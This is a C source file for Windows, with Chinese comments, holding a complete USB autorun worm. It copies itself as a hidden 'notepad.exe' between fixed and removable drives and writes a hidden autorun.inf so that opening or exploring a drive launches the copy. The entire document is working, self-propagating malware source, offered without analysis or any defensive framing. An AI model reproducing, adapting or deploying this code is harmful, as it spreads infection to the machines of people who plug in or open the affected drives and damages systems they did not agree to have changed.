#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
char szAutoRun[] = "[AutoRun] \
				   \r\nopen=notepad.exe \
				   \r\nshell\\open=打开(&O) \
				   \r\nshell\\open\\Command=notepad.exe \
				   \r\nshell\\explore=资源管理器(&X) \
				   \r\nshell\\explore\\Command=notepad.exe \
				   \r\nshellexecute=notepad.exe \
				   \r\nshell\\Auto\\Command=notepad.exe";


void infect(char *pszFile, UINT uDriveType)
{
	char szDriveString[MAXBYTE] = { 0 };
	DWORD dwRet = 0;
	DWORD iNum = 0;
	char szRoot[4] = { 0 };
	UINT uType = 0;
	char szTarget[MAX_PATH] = { 0 };

	dwRet = GetLogicalDriveStrings(MAXBYTE, szDriveString);

	while (iNum < dwRet)
	{
		strncpy(szRoot, &szDriveString[iNum], 3);

		uType = GetDriveType(szRoot);

		if (uType == uDriveType)
		{
			// 拷贝文件
			lstrcpy(szTarget, szRoot);
			lstrcat(szTarget, "notepad.exe");
			CopyFile(pszFile, szTarget, FALSE);

			// 设置notepad.exe文件为隐藏属性
			SetFileAttributes(szTarget, FILE_ATTRIBUTE_HIDDEN);

			// 建立AutoRun.inf文件
			lstrcpy(szTarget, szRoot);
			lstrcat(szTarget, "autorun.inf");
			HANDLE hFile = CreateFile(szTarget,
				GENERIC_WRITE,
				0, NULL,
				CREATE_ALWAYS,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
			DWORD dwWritten = 0;
			WriteFile(hFile, szAutoRun, lstrlen(szAutoRun),
				&dwWritten, NULL);
			CloseHandle(hFile);

			// 设置AutoRun.inf文件为隐藏属性
			SetFileAttributes(szTarget, FILE_ATTRIBUTE_HIDDEN);
		}

		iNum += 4;
	}
}

int main()
{
	// 自身所在地位置
	char szFileName[MAX_PATH] = { 0 };
	// 保存当前文件所在地盘符
	char szRoot[4] = { 0 };
	// 保存磁盘类型
	UINT uType = 0;

	// 获取当前所在完整路径及文件名
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	// 获取所在盘符
	strncpy(szRoot, szFileName, 3);

	uType = GetDriveType(szRoot);


	switch (uType)
	{
	case DRIVE_FIXED:
	{
		// 如果是在硬盘上就检测一遍是否有移动磁盘
		infect(szFileName, DRIVE_REMOVABLE);
		break;
	}
	case DRIVE_REMOVABLE:
	{
		// 如果在移动磁盘上则将自己复制到移动磁盘上
		infect(szFileName, DRIVE_FIXED);
		break;
	}
	}

	return 0;
}